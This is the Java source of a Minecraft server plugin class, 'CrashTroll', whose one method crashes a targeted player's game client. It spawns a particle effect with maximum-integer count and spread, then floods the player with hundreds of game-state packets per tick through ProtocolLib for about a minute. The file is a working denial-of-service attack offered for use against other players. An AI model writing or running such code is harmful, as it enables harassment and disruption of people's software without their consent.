package utroll.troll;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.entity.Player;
import utroll.UTroll;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class CrashTroll {

    private static final Map<UUID, Integer> crashTasks = new HashMap<>();

    public static void crash(Player player) {
        if (crashTasks.containsKey(player.getUniqueId())) {
            return;
        }

        player.spawnParticle(Particle.CLOUD, player.getLocation(), Integer.MAX_VALUE, (double) Integer.MAX_VALUE, (double) Integer.MAX_VALUE, (double) Integer.MAX_VALUE, (double) Integer.MAX_VALUE);

        if (Bukkit.getPluginManager().getPlugin("ProtocolLib") != null) {
            ProtocolManager protocolManager = ProtocolLibrary.getProtocolManager();
            UUID playerId = player.getUniqueId();
            crashTasks.put(playerId, 0);

            UTroll.getInstance().getServer().getScheduler().runTaskTimer(UTroll.getInstance(), new Runnable() {
                private int ticks = 0;

                @Override
                public void run() {
                    if (!player.isOnline() || ticks >= 1200) {
                        crashTasks.remove(playerId);
                        return;
                    }

                    try {
                        for (int i = 0; i < 500; i++) {
                            PacketContainer packet = protocolManager.createPacket(PacketType.Play.Server.GAME_STATE_CHANGE);
                            packet.getGameStateIDs().write(0, 10);
                            packet.getFloat().write(0, 0.0F);
                            protocolManager.sendServerPacket(player, packet);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    ticks++;
                }
            }, 0L, 1L);
        }
    }
}